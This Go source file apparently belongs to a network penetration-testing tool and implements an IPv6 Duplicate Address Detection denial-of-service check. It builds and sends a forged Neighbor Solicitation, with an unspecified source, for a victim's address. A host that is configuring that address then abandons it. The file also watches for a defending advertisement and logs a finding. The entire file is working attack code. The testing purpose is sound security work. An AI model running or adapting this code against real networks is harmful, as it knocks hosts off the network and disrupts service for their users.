// daddos.go implements the duplicate-address denial check via DAD.
// Impact temporary, restore decay, affects clients: the Neighbor
// Solicitation for the victim's address makes a host that is running DAD
// for it give the address up, and a host that already holds it defends
// it, which the finding records. The DAD window passes on its own after
// the check, so there is nothing to restore.

package ip6

import (
	"context"
	"encoding/json"
	"fmt"
	"net"
	"time"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/common/errs"

	"go.aledante.io/FlowSeer/src/edge/netpen/attacks/internal/craft"
	"go.aledante.io/FlowSeer/src/edge/netpen/check"
)

type dadDOSFinding struct {
	Action   string `json:"action"`
	Target   string `json:"target"`
	Resisted bool   `json:"resisted"`
	Frames   int    `json:"frames"`
}

// RunDADDOS sends a Neighbor Solicitation for the target's IPv6 victim
// address during DAD to deny the legitimate host's address configuration,
// then reads the attack leg for the window. The predicate is a Neighbor
// Advertisement for the address: one within the window shows a host holds
// and defends it, which resists; none is pending, since a host that
// abandons the address sends no frame. Cancellation while observing
// returns ctx.Err(). A terminal receive error comes back wrapped.
func RunDADDOS(ctx context.Context, deps check.Deps) (check.Verdict, error) {
	if err := deps.Target.Need(check.FieldVictim6); err != nil {
		return check.Verdict{}, err
	}
	src := deps.AttackLeg.Addr().MAC
	target := deps.Target.Victim6.IP

	pkt, err := craftDADNS(src, target)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "daddos: craft NS")
	}
	if err := deps.AttackLeg.Send(ctx, pkt); err != nil {
		return check.Verdict{}, errs.Wrap(err, "daddos: send NS")
	}

	defense, obs, err := check.First(ctx, deps.AttackLeg, deps.Observe, func(data []byte) bool {
		return isAdvertisementFor(data, target)
	})
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "daddos: receive defense")
	}

	detail, _ := json.Marshal(dadDOSFinding{
		Action:   "dad-denial",
		Target:   target.String(),
		Resisted: defense != nil,
		Frames:   1,
	})
	deps.Emitter.Finding("ipv6-nd", detail)

	if defense != nil {
		return check.Resisted(fmt.Sprintf("a host holds %s and defended it", target), obs.Elapsed), nil
	}
	return check.Pending(fmt.Sprintf("no defense in %s: abandonment leaves no frame", obs.Elapsed.Round(time.Millisecond))), nil
}

// craftDADNS builds a DAD Neighbor Solicitation: source is unspecified,
// destination is the solicited-node multicast for the target.
func craftDADNS(src net.HardwareAddr, target net.IP) ([]byte, error) {
	snMAC := solicitedNodeMAC(target)
	snIP := solicitedNodeIP(target)

	eth := &layers.Ethernet{
		DstMAC:       snMAC,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeIPv6,
	}
	ip := &layers.IPv6{
		Version:    6,
		NextHeader: layers.IPProtocolICMPv6,
		HopLimit:   255,
		SrcIP:      net.IPv6zero, // DAD: source is unspecified
		DstIP:      snIP,
	}
	icmp := &layers.ICMPv6{
		TypeCode: layers.CreateICMPv6TypeCode(layers.ICMPv6TypeNeighborSolicitation, 0),
	}
	_ = icmp.SetNetworkLayerForChecksum(ip)

	ns := &layers.ICMPv6NeighborSolicitation{
		TargetAddress: target,
		Options: layers.ICMPv6Options{
			{
				Type: layers.ICMPv6OptSourceAddress,
				Data: src, // attacker's source LLA
			},
		},
	}
	return craft.Default(eth, ip, icmp, ns)
}

var _ gopacket.SerializableLayer = (*layers.ICMPv6NeighborSolicitation)(nil)
